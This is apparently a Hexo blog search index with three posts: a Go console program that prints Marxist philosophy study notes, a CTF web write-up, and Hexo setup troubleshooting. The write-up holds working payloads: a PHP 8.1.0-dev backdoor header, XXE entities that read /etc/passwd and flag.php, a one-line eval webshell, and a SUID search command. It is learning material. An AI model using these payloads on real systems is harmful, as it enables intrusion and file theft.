量变是事物数量的增减和组成要素排列次序的变动，是保持事物的质的相对稳定性的不显著变化，体现了事物发展渐进过程的连续性。\n50 质变是事物性质的根本变化，是事物由一种质态向另一种质态的飞跃，体现了事物发展渐进过程和连续性的中断。\n51 量变和质变的辩证关系是：第一，量变是质变的必要准备。二，质变是量变的必然结果，并为新的量变开辟道路。第三，量变和质变是相互渗透的。\n52 事物的发展是通过其内在矛盾运动以自我否定的方式而实现的。\n53 辩证否定观：\n第一，否定是事物的自我否定、自我发展，是事物内部矛盾运动的结果。\n第二，否定是事物发展的环节，是旧事物向新事物的转变，是从旧质到新质的飞跃。只有经过否定，旧事物才能向新事物转变。\n第三，否定是新旧事物联系的环节，新事物孕育产生于旧事物，新旧事物是通过否定环节联系起来的。\n第四，辩证否定的实质是“扬弃\&quot;,即新事物对旧事物既批判又继承，既克服其消极因素又保留其积极因素。\n54 事物的发展呈现出周期性，即波浪式前进或螺旋式上升的总趋势。\n55 内容是事物存在的基础，对形式具有决定作用。\n56 现象可以区分为真象和假象。\n57 本质决定现象。\n58 原因与结果是揭示事物引起和被引起关系的一对范畴。\n59 必然起着决定性作用，并制约着偶然的作用形式及其变化。\n60 在马克思主义世界观和方法论中，唯物辩证法是其核心内容。\n61 唯物辩证法是客观辩证法（客观事物或客观存在的辩证法）与主观辩证法（人类认识和思维运动的辩证法）的统一。\n62 辩证思维方法有归纳与演绎、分析与综合、抽象与具体、逻辑与历史相统一。\n63 六大思维能力：辩证思维能力、历史思维能力、系统思维能力、战略思维能力、底线思维能力和创新思维能力。\n&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;第二章&quot;</span>)<br>   fmt.Println(<span class="hljs-string">&quot;\n实践观：\n1 实践的观点是马克思主义的基本观点。\n2 人与世界的关系主要包括两个方面：一是认识世界，二是改造世界。\n3 在《关于费尔巴哈的提纲》中，马克思系统论述了实践的观点，揭示了科学实践观的基本内容。\n4 科学实践观的意义：克服了旧唯物主义的根本缺陷，为辩证唯物主义奠定了科学的理论基础。建立了科学的、能动的、革命的反映论，实现了人类认识史上的变革。第一次揭示了社会生活的实践本质，为创建科学的历史观奠定了理论基础。为人们能动地认识世界和改造世界提供了基本的思想方法和工作方法。\n5 实践的特征\n6 实践主体\n7\n8 物质生产实践是最基本的实践活动；解决人与自然的矛盾；产生基本经济关系；决定社会的基本性质和面貌。\n9 实践中介\n10 实践的作用\n认识论\n1 唯物主义反映论：“物到感觉和思想”的认识路线。\n唯心主义先验论：“思想和感觉到物”的认识路线。\n2 \n3 认识的过程\n具体过程\n总过程\n4 感性认识和理性认识\n5 感性认识和理性认识是辩证统一的：第一，感性认识有待于发展和深化为理性认识。第二，理性认识依赖于感性认识。第三，感性认识和理性认识相互渗透、相互包含。\n反对：唯理论和经验论\n6 从感性认识上升到理性认识，必须具备两个基本条件：第一，投身实践，深入调查，获取十分丰富和合乎实际的感性材料。这是实现由感性认识上升到理性认识的基础。第二，经过思考的作用，运用理论思维和科学抽象，将丰富的感性材料加以去粗取精、去伪存真、由此及彼、由表及里的处理加工，形成概念和理论的系统。\n7 非理性因素主要是指认识主体的情感和意志，对于人的认识能力和认识活动具有激活、驱动作用。\n8 认识过程的两次飞跃：\n9\n10 认识和实践过程的反复性和无限性：说它“完成了＂，是针对具体事物的认识而言的。说它“又没有完成”，是针对实践和认识运动过程的向前推移、向前发展而言的。\n11 在实践和认识的辩证运动中，主观必须统一于客观，认识必须统一于实践。\n真理论\n1 真理是标志主观与客观相符合的哲学范畴，是对客观事物及其规律的正确反映。\n2 真理的客观性指真理的内容是对客观事物及其规律的正确反映，真理中包含着不依赖千人和人的意识的客观内容。客观性是真理的本质属性，但是真理的形式又是主观的，真理主要通过概念、判断、推理等主观形式表达出来。\n3 真理是客观的，凡真理都是客观真理，这是真理问题上的唯物论。\n4 真理的客观性决定了真理的一元性。\n5 真理是内容上的一元性与形式上的多样性的统一。\n6 任何真理都是绝对性和相对性的统一，二者相互联系、不可分割。\n7 真理的绝对性与相对性根源于人类认识世界能力的无限性与有限性、绝对性与相对性的矛盾。\n8 真理和谬误\n9 实践是检验真理的唯一标准是由真理的本性（客观性）和实践的特点（直接现实性）决定的。\n10 实践标准的确定性与不确定性：\n实践标准的确定性即绝对性，是指实践作为检验真理标准的唯一性、归根到底性、最终性，离开实践，再也没有其他公正合理的标准。\n实践标准的不确定性即相对性，是指实践作为检验真理标准的条件性。一方面，任何实践都会受到主客观条件的制约，因而都具有不可能完全证实或驳倒一切认识的局限性；另一方面，实践是社会的、历史的实践，由于历史条件的种种限制，实践对真理的检验具有相对性、有限性，表现为具体的实践往往只是在总体上证实认识与它所反映的客观事物是否相符合，而不可能绝对地、永恒地、一劳永逸地予以确证。\n11 逻辑证明也不能取代实践作为检验真理的标准：\n    \uF026逻辑证明可以起到重要的补充作用，\n\uF026逻辑证明是探索真理、论证真理的方式，\n\uF026逻辑证明只能回答前提与结论的关系是不是符合逻辑的问题，\n\uF026已被逻辑证明了的东西，还必须经过实践的检验。\n\n四 价值论\n&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;第三章&quot;</span>)<br>   fmt.Println(<span class="hljs-string">&quot;1 两种历史观\n2 \n3 自然地理环境和人口因素，都不能脱离社会生产而发生作用，都不能决定社会的性质和社会形态的更替。\n4 物质生产方式（生产力和生产关系）是社会存在和发展的基础及决定力量。首先，物质生产活动及生产方式是人类社会赖以存在和发展的基础，是人类其他一切活动的首要前提。\n其次，物质生产活动及生产方式决定着社会的结构、性质和面貌，制约着人们的经济生活、政治生活和精神生活等全部社会生活。\n最后，物质生产活动及生产方式的变化发展决定整个社会历史的变化发展，决定社会形态从低级向高级的更替和发展。\n5 社会意识\n6 政治法律思想是最直接、最集中地反映经济基础的意识形态，在意识形态中居于核心地位，起主导作用。\n7 在阶级社会中，占统治地位的思想文化，本质上是经济上占统治地位的阶级的意识形态，因而具有鲜明的阶级属性。\n8 社会存在决定社会意识，社会意识是社会存在的反映，并反作用于社会存在\n9 社会意识对社会存在具有能动的反作用，这是社会意识相对独立性的突出表现。\n10 文化对社会发展的重要作用主要表现在：\n第一，文化为社会发展提供思想保证。第二，文化为社会发展提供精神动力。第三，文化为社会发展提供智力支持。第四，文化为社会发展提供凝聚力量。\n11 哲学社会科学的发展水平和繁荣程度，是一个民族综合素质和国家文化软实力的重要体现和突出标志。\n12 生产力与生产关系、经济基础与上层建筑之间的矛盾，是人类社会基本矛盾。\n13 生产力\n14 科学技术是第一生产力\n15 生产关系\n16 经济基础\n17 上层建筑\n18 国家\n19 交往\n20 世界历史\n21 社会形态更替的规律\n22 社会发展的动力系统\n23 英雄史观\n24 唯物史观的原则\n25 人民群众\n26 杰出人物的历史作用\n27 群众 政党和领袖的关系\n&quot;</span>)<br><br>  &#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">zzx</span><span class="hljs-params">()</span></span>  &#123;<br>fmt.Println(<span class="hljs-string">&quot;芜湖，竟然有人找我聊天&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;好嘛，来，我们就来好好聊聊&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;你想和我聊什么：\n1.马克思主义的魅力\n2.中年失业危机的经济学分析\n3.六大逻辑思维能力的自我适用性分析&quot;</span>)<br><span class="hljs-keyword">var</span> num4 <span class="hljs-type">int8</span><br><span class="hljs-keyword">for</span> &#123;<br>_, err := fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num4)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> num4==<span class="hljs-number">1</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;马克思主义的魅力，就我的所见所闻，所贴身感受而言，我认为它的魅力在于当我开始学习它的时候有一种豁然开朗的感觉，用马克思的话说那些“神秘的东西都不复存在”。经过这段时间的学习，马克思主义给我印象最深刻的就是政治经济学的部分。它揭示了资本主义经济繁荣面纱下的丑陋真面目，揭露了资产阶级剥削工人阶级剩余价值来获取利润的实质。我深深的记得赵老师的举例：资本家不断的宣传你只能出卖自己的劳动来赚钱是因为“你没有一个好爹”，是因为你“懒”，你“馋”，但其实不是这样的，他们这样只是想你让你觉得出卖自己的劳动给资本家，是应该的，是自己的原因。而我感觉就是在被这种思想灌输下长大的，我从下看到的各种事情现象无不基于这样的思想，但现在有点醒悟的我，却还是不知道该怎么办，面对这样的情况处境，我无能为力。今天还和同学讨论，最后的结论竟然是，共产主义离我们太远了，要想在这个时代解放自己，只能成为资本家了。但这只是开玩笑，在我们国家，还可以进入公有制体系下工作。但我还是在行动上很迷茫，希望之后继续了解学习马克思主义能让我找到方法。&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num4==<span class="hljs-number">2</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;很简单，资本家需要廉价劳动力，这样他们可以压榨劳动力的更多剩余价值，获得更多利润。没有什么比年轻没有资历独身的人更廉价的了，而那些到了中年的有了更多生活压力，生活需求的人则会被资本家抛弃，这就是“中年失业危机”的主要原因。&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num4==<span class="hljs-number">3</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;六大逻辑思维能力分别是辩证思维能力，思维能力历史，战略思维能力，底线思维能力，创新思维能力，系统思维能力。每一个都很有用，其中我觉得对我最适用的是历史。因为我觉得我有时候经常因为自我的矛盾，或者各种各样的想法而感到悲伤。比如，我和别人同样努力这么多年，最后ta事业有成，而我岌岌无名；又或者想到初中也是学校数一数二的人物，到了高中大学却泯然众人。我常常不能和自己自洽，所以，我觉得如果有历史思维能力，从历史的起伏与时间跨度中我能感悟到，我一人小小的人生只对我一个人特别重要，我能过好自己人生的每一秒就好，不论结果如何，这这短短人生中活出自己的滋味就很好。&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//cout:=0</span><br>fmt.Println(<span class="hljs-string">&quot;欢迎来到马克思主义聊天室！！！！！&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;你可以选择你的聊天对象：\n1.马克思\n2.恩格斯\n3.赵斌同志\n4.作者本人&quot;</span> )<br>fmt.Println(<span class="hljs-string">&quot;你想选择的对象是(输入数字)：&quot;</span>)<br><span class="hljs-keyword">var</span> num <span class="hljs-type">int</span><br>fmt.Scanln(&amp;num)<br><span class="hljs-keyword">if</span> num==<span class="hljs-number">1</span> &#123;<br>mks()<br>&#125;<br><span class="hljs-keyword">if</span> num==<span class="hljs-number">2</span> &#123;<br>egs()<br>&#125;<br><span class="hljs-keyword">if</span> num==<span class="hljs-number">3</span> &#123;<br>zh()<br>&#125;<br><span class="hljs-keyword">if</span> num==<span class="hljs-number">4</span> &#123;<br>zzx()<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>GO</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>20210601cumtctf</title>
    <link href="/post/20210601cumtctf.html"/>
    <url>/post/20210601cumtctf.html</url>
    
    <content type="html"><![CDATA[<h2 id="0x01web签到"><a href="#0x01web签到" class="headerlink" title="0x01web签到"></a>0x01web签到</h2><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034622.png" alt="php8.0.1"></p><p>查看题目，看到“I’m the best language in the world！！！”。联想到php是世界上最好的语言，所有这题肯定和php有关。因为之前有入门赛出过类似的谜语题，当时post bxs=什么什么就出flag了，还以为这题也一样，结果传了好一会没用，后来抓包试试，查看返回包。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034256.png" alt="2"></p><p>发现php版本信息，版本为php/8.1.0-dev，该版本可能存在后门。</p><p><strong>php/8.1.0-dev后门漏洞</strong></p><p>可以通过发送User-Agentt头来执行任意代码。</p><p>示例：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034142.png" alt="3"></p><p>添加<code>User-Agentt:zerodiumvar_dump(2*3);</code>发现代码被执行；接着请求<code>User-Agentt:zerodiumsystem(&quot;cat flag.php&quot;);</code> 或者<code>User-Agentt:zerodiumshow_source(&quot;flag.php&quot;);</code> 查看flag.php。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202034482.png" alt="4"></p><p>拿到flag</p><p>tips：大佬说谜语题一般是找备份文件，挨个网页看源代码，看返回响应头</p><h2 id="0x02别大E"><a href="#0x02别大E" class="headerlink" title="0x02别大E"></a>0x02别大E</h2><p><strong>xxe漏洞</strong></p><p>参考文章：<a href="https://blog.csdn.net/zxpo/article/details/4020701">https://blog.csdn.net/zxpo/article/details/4020701</a>（示例明显能看到实体的作用）</p><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a>（xxe漏洞/xml基础知识）</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/106112654">https://blog.csdn.net/qq_45521281/article/details/106112654</a>一道典型的xxe ctf，和此题差不多。</p><p>回到此题</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035623.png" alt="2.1"></p><p>抓包，post传payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  //实体定义+读取敏感文件</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035292.png" alt="2.4 "></p><p>能够读到敏感信息，试着读取flag所在文件，一般flag在flagphp,flag.txt等等。</p><p>这题可查看页面源代码</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035920.png" alt="2.7"></p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035602.png" alt="2.8"></p><p>尝试访问aGludHR0.php，知道了flag在flag.php中</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035768.png" alt="2.6"></p><p>构建payload，读取flag.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>base64解码就行</p><h2 id="0x03get-shell"><a href="#0x03get-shell" class="headerlink" title="0x03get shell"></a>0x03get shell</h2><p>这题就写一下看学长做的一种方法吧，其它的暂时不会。</p><p>用到的工具：</p><p>php混淆类代码解密在线网站：<a href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a>，蚁剑。</p><p>看题</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202035682.png" alt="canvas"></p><p>放在解码网站里解得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ymlisisisiook]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可见是一句话木马，查看phpinfo.php，发现有些函数被禁了</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036938.png" alt="3.1"></p><p>其中包括system等，能够进行命令执行的函数被禁。上蚁剑绕过disable_functions。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036993.png" alt="3.2">密码为ymlisisisiook</p><p>上插件，成功后编辑数据，网址后面加上.antproxy.php,密码不变</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036761.png" alt="3.3"></p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036340.png" alt="3.4"></p><p>这时候就发现能访问到上级目录了</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036778.png" alt="3.5"></p><p>发现flag文件，但点进去没有，说明还没有权限</p><p>用suid命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找有权限查看文件的命令，发现有cat，然后查看/flag即可。</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211202036037.png" alt="3.6"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建博客中遇到的问题</title>
    <link href="/post/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98.html"/>
    <url>/post/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98.html</url>
    
    <content type="html"><![CDATA[<h2 id="1-在hexo-clean-hexo-g-hexo-d三步后出现404页面"><a href="#1-在hexo-clean-hexo-g-hexo-d三步后出现404页面" class="headerlink" title="1.在hexo clean+hexo g+hexo d三步后出现404页面"></a>1.在hexo clean+hexo g+hexo d三步后出现404页面</h2><p>​     其实只是少做了一步操作，就是在github的setting（翻到底层）在github page中的custom domian中输入自己的域名即可，每次进行hexo clean操作后都要重复该操作，不过也可能是因为我绑定了属于自己的域名的缘故。</p><h2 id="2-在hexo-clean时或者hexo-g时出现指向冒号的报错"><a href="#2-在hexo-clean时或者hexo-g时出现指向冒号的报错" class="headerlink" title="2.在hexo clean时或者hexo g时出现指向冒号的报错"></a>2.在hexo clean时或者hexo g时出现指向冒号的报错</h2><p>​     一般出现这种错误是因为冒号后面没有打空格，但是确实后面打空格了，但还是报错，最终无法再删掉了blog文件，再来一次就ok了。</p><h2 id="3-域名绑定"><a href="#3-域名绑定" class="headerlink" title="3.域名绑定"></a>3.域名绑定</h2><p>​     看了各种教程，其实只需要搞定两个地方就行，一是在域名解析器中加入CANEM记录，前面一格填@即可，填@域名为xindewin.cn;www则为www.xindewin.cn  ；二是在github page中的custom domian中输入自己的域名即可。会有一小会的延迟，不要着急。记得域名要实名，不然也是不成功的。</p><h2 id="4-hexo-g部署文章时报错-err-YAMLException-can-not-read-a-block-mapping-entry-a-multiline-key-may-not-be-an-implicit-key-at-line-4-column-1"><a href="#4-hexo-g部署文章时报错-err-YAMLException-can-not-read-a-block-mapping-entry-a-multiline-key-may-not-be-an-implicit-key-at-line-4-column-1" class="headerlink" title="4.hexo g部署文章时报错 err: YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:"></a>4.hexo g部署文章时报错 err: YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:</h2><p>（空行）</p><p>  其实这个问题line 4多了一排空行，不要纠结at\node_modules\hexo-front-matter\node_modules\js-yaml\lib\js-yaml\loader.js之类的文字。</p><h2 id="5访问页面出现extends-includes-layout-pug-block-content-include-includes-recent-posts-pug-include-includes-partial"><a href="#5访问页面出现extends-includes-layout-pug-block-content-include-includes-recent-posts-pug-include-includes-partial" class="headerlink" title="5访问页面出现extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial"></a>5访问页面出现<code>extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial</code></h2><p>在git bash中输入<code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code></p><p>再</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo s</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p><strong>还没下载图片插件，第一篇blog写得比较简陋，不过也是一个好的开始，希望之后能耐心写下更多的学习或者经验内容，也很感谢azuki，在我网络搜寻无果解决不了问题的时候给予了我许多帮助，而且博客一开始也是他花时间带我下的，不然我一个小白也不知道还可以写博客，哈哈。</strong></p>]]></content>
    
    
    <categories>
      
      <category>blog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
